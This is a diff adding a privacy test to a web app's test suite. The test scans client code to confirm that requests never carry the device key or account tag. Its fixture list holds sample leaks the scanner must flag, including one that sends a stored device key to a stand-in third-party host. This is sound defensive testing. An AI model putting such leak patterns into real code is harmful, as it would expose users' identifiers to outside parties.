@@ -242,3 +242,63 @@ test("S17. PC3: the account tag is opaque, stable per account and secret, and di
   assert.notEqual(accountTag("t".repeat(40), "user-1"), t1, "keyed by the secret");
   assert.ok(!t1.includes("user"));
 });
+
+test("S18. W-1913 privacy condition 1 (as amended by PC10): no fetch or sendBeacon argument reaches the device key or the account tag, except the PC10 header to our own write routes", async () => {
+  const { scanSource, codeOnly, CLIENT_FILE, WRITE_ROUTES } = await import("./tag-scan.mjs");
+  // 1. The whole of src/: every request argument, followed through locals, assignments, parameters and returns.
+  const hits = SRC.flatMap((f) => scanSource(rel(f), read(f)));
+  assert.deepEqual(hits, [], "a request can carry the device key or the tag");
+  // 2. The scan catches what it must (each of these must be flagged).
+  const bad = {
+    "tag to the event beacon": `navigator.sendBeacon("/api/events", JSON.stringify({ a: me.tag }));`,
+    "tag through a local": `const t = me.tag; fetch("/api/likes/counts?slugs=" + t);`,
+    "device key read into a body": `const d = readDevice(); fetch("/api/account/merge", { method: "POST", body: JSON.stringify(d) });`,
+    "device key by its literal": `fetch("https://third.example/x", { body: localStorage.getItem("s3c:account-device:v1") });`,
+    "tag added to a body later": `const body = {}; body.who = syncTag; fetch("/api/account/progress", { method: "PUT", headers: boundHeaders(syncTag, true), body: JSON.stringify(body) });`,
+    "tag through a parameter": `function send(x) { return fetch("/api/events", { method: "POST", body: x }); } send(me.tag);`,
+    "tag through a local function": `function who() { return me.account; } fetch("/api/events", { body: who() });`,
+    "the header to the event route": `fetch("/api/events", { method: "POST", headers: boundHeaders(me.tag, true) });`,
+    "the header to a third party": `fetch("https://third.example/api/account/progress", { method: "PUT", headers: boundHeaders(me.tag, true) });`,
+    "the header to a read route": `fetch("/api/account/export", { headers: boundHeaders(me.tag, false) });`,
+    "the header built up elsewhere": `const h = boundHeaders(me.tag, true); fetch("/api/account/progress", { method: "PUT", headers: h });`,
+    "the header name by hand": `fetch("/api/account/progress", { method: "PUT", headers: { "x-s3c-account": "abc" } });`,
+    "a template route with more after the slug": "fetch(`/api/account/saves/${encodeURIComponent(slug)}?t=1`, { headers: boundHeaders(me.tag, false) });",
+  };
+  for (const [what, code] of Object.entries(bad)) assert.notDeepEqual(scanSource(CLIENT_FILE, code), [], `not caught: ${what}`);
+  // ...and the header to an allowed route, in the client file only, is the one exception.
+  assert.deepEqual(scanSource(CLIENT_FILE, `fetch("/api/account/merge", { method: "POST", headers: boundHeaders(me.tag, true), body: "{}" });`), []);
+  assert.notDeepEqual(scanSource("src/components/Feed.tsx", `fetch("/api/account/merge", { method: "POST", headers: boundHeaders(me.tag, true) });`), [], "only account-client.ts");
+  // 3. Backstop by name across files (the scan does not follow imports): the tag's helpers and the device key live
+  // only in these files (code, not comments); the only other use of `.tag` is AccountView's React key (never
+  // rendered, never sent).
+  const names = /DEVICE_KEY|boundHeaders|ACCOUNT_HEADER|accountTag|sameAccountHeader|s3c:account-device:v1|x-s3c-account|\.tag\b/;
+  const code = new Map(SRC.map((f) => [f, names.test(read(f)) ? codeOnly(rel(f), read(f)) : ""]));
+  const homes = {
+    DEVICE_KEY: ["src/lib/account-client.ts"],
+    boundHeaders: ["src/lib/account-client.ts"],
+    ACCOUNT_HEADER: ["src/lib/account-client.ts", "src/lib/server/http.ts"],
+    accountTag: ["src/lib/server/account-api.ts", "src/lib/server/http.ts"],
+    sameAccountHeader: ["src/lib/server/account-api.ts", "src/lib/server/http.ts"],
+    "s3c:account-device:v1": ["src/lib/account-client.ts", "src/lib/server/http.ts"],
+    "x-s3c-account": ["src/lib/account-client.ts", "src/lib/server/http.ts"],
+  };
+  for (const [name, files] of Object.entries(homes)) {
+    const found = SRC.filter((f) => code.get(f).includes(name)).map(rel).sort();
+    assert.deepEqual(found, [...files].sort(), `${name} appears only in its home files`);
+  }
+  // Of the files that can hold a /me answer (account-client.ts and its importers), only AccountView reads `.tag`.
+  const holders = SRC.filter((f) => rel(f) === CLIENT_FILE || /from\s+["']@\/lib\/account-client["']|import\(["']@\/lib\/account-client["']\)/.test(read(f)));
+  const tagUsers = holders.filter((f) => /\.tag\b/.test(code.get(f))).map(rel).sort();
+  assert.deepEqual(tagUsers, ["src/components/account/AccountView.tsx", "src/lib/account-client.ts"]);
+  const viewTag = [...code.get(path.join(ROOT, "src/components/account/AccountView.tsx")).matchAll(/\S*\.tag\b\S?/g)].map((m) => m[0]);
+  assert.deepEqual(viewTag, ["key={me.tag}"], "AccountView uses the tag only as a React key");
+  // 4. The client and server name the same header, and the server binds exactly the routes the exception allows.
+  const lit = (f, re) => read(path.join(ROOT, f)).match(re)?.[1];
+  assert.equal(lit("src/lib/account-client.ts", /export const ACCOUNT_HEADER = "([^"]+)"/), "x-s3c-account");
+  assert.equal(lit("src/lib/server/http.ts", /export const ACCOUNT_HEADER = "([^"]+)"/), "x-s3c-account");
+  const apiSrc = read(path.join(ROOT, "src/lib/server/account-api.ts"));
+  assert.deepEqual([...apiSrc.matchAll(/boundWrite\(req, a\.id, "(\w+)"\)/g)].map((m) => m[1]), ["progress", "merge", "delete", "mark"]);
+  assert.deepEqual(WRITE_ROUTES, { exact: ["/api/account/progress", "/api/account/merge", "/api/account/delete"], prefix: ["/api/account/saves/", "/api/account/likes/"] });
+  // 5. The server reads the header only to compare it; nothing logs or stores it (S8 covers logging in general).
+  assert.ok(!/log[A-Za-z]*\([^)]*ACCOUNT_HEADER/.test(read(path.join(ROOT, "src/lib/server/http.ts")) + apiSrc));
+});
